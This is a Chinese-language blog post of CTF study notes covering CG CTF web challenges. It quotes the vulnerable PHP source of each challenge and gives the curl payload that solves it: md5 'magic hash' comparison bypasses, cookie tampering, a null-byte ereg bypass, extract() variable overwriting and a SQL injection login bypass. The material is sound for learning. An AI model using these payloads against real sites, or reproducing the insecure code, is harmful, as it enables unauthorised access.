@@ -1,0 +1,192 @@
+---
+layout: post
+title:  "信息安全学习笔记 - CG CTF"
+date:   2020-03-21 13:15:38 +0800
+---
+
+## 签到题
+
+点开题目右键检查元素可以找到在a标签里面display属性为none的文本。
+
+## [md5 collision](http://chinalover.sinaapp.com/web19/)
+
+```php
+# Source
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset($a)){
+if ($a != 'QNKCDZO' && $md51 == $md52) {
+    echo "nctf{*****************}";
+} else {
+    echo "false!!!";
+}}
+else{echo "please input a";}
+```
+
+```shell
+echo -n QNKCDZO | md5sum
+# 0e830400451993494058024219903391  -
+```
+巧合在于`QNKCDZO`的md5恰好是一个科学记数法表示的字符串而且值为0。使用`==`时，如果是这类字符串和一个数字比较，或者两个都是这类字符串，PHP会把这类字符串转换成浮点数。如果恰好输入参数a的md5值恰好也是一个科学记数法表示的0，那么验证的逻辑就会被绕过了。
+
+```shell
+curl http://chinalover.sinaapp.com/web19/?a=s214587387a
+```
+
+javascript里也存在类似的问题，区别在于如果两个都是字符串则不会转换
+
+```javascript
+0e111 == '0e12345'  // true
+'0E111' == '0e12345' // false
+```
+
+### Notes
+- `==` and float number format strings in php: [Why md5('240610708') is equal to md5('QNKCDZO')?](https://stackoverflow.com/questions/22140204)
+
+
+## 签到2
+
+需要修改输入框的maxlength。
+
+
+## [单身一百年也没用](http://chinalover.sinaapp.com/web9/)
+
+flag在响应的header里面。
+
+## [Cookie](http://chinalover.sinaapp.com/web10/index.php)
+
+curl的结果中有个Set-Cookie: Login=0，server也许是通过这个Login的值判断有没有登录。这里的提示是cookie和session不一致。
+
+```shell
+curl http://chinalover.sinaapp.com/web10/index.php -v -H 'Cookie: Login=1'
+```
+<!-- 
+## [MYSQL](http://chinalover.sinaapp.com/web11/)
+
+提示是robots.txt，所以
+
+```shell
+curl http://chinalover.sinaapp.com/web11/robots.txt
+```
+
+```php
+# Source
+<?php
+if($_GET[id]) {
+   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $id = intval($_GET[id]);
+  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
+  if ($_GET[id]==1024) {
+      echo "<p>no! try again</p>";
+  }
+  else{
+    echo($query[content]);
+  }
+}
+?>
+```
+
+### Notes
+
+- robots.txt
+- `intval` in php -->
+
+## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)
+
+```php
+# Source
+if (isset ($_GET['nctf'])) {
+    if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
+        echo '必须输入数字才行';
+    else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
+        die('Flag: '.$flag);
+    else
+        echo '骚年，继续努力吧啊~';
+}
+```
+题目有提示`\x00`
+```shell
+curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=12222%00%23biubiubiu
+```
+### Notes
+
+- `ereg`: null byte is considered as the end of string
+- [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls
+  - null byte "\x00": `%00`
+  - pound sign "#": `%23`
+  - single quote "'": `%27`
+  - right parenthesis ")": `%29`
+
+## [bypass again](http://chinalover.sinaapp.com/web17/index.php)
+
+```php
+# Sources
+if (isset($_GET['a']) and isset($_GET['b'])) {
+if ($_GET['a'] != $_GET['b'])
+if (md5($_GET['a']) == md5($_GET['b']))
+die('Flag: '.$flag);
+else
+print 'Wrong.';
+}
+```
+前面的两个float number format string应该派上用场了。
+```shell
+curl 'http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&&b=s214587387a'
+```
+
+## [变量覆盖](http://chinalover.sinaapp.com/web18/index.php)
+
+```html
+<!-- Sources -->
+<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
+  <?php
+  extract($_POST);
+  if ($pass == $thepassword_123) { ?>
+      <div class="alert alert-success">
+          <code><?php echo $theflag; ?></code>
+      </div>
+  <?php } ?>
+<?php } ?>
+```
+
+```shell
+curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123=kke'
+```
+
+### Notes
+
+- php `extract` imports variables into the current symbol table from an array
+
+## [SQL注入1](http://chinalover.sinaapp.com/index.php)
+
+不看源代码试不出来
+
+```php
+# Sources
+if($_POST[user] && $_POST[pass]) {
+    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = trim($_POST[user]);
+  $pass = md5(trim($_POST[pass]));
+  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
+    echo '</br>'.$sql;
+  $query = mysql_fetch_array(mysql_query($sql));
+  if($query[user]=="admin") {
+      echo "<p>Logged in! flag:******************** </p>";
+  }
+  if($query[user] != "admin") {
+    echo("<p>You are not admin!</p>");
+  }
+}
+echo $query[user];
+```
+
+```shell
+curl http://chinalover.sinaapp.com/index.php -X POST -d 'user=admin%27%29+--+k&pass=Password'
+```
+
+### Notes
+
+- [comments in MySQL](https://stackoverflow.com/a/14436098/8706476): `--` followed by space characters
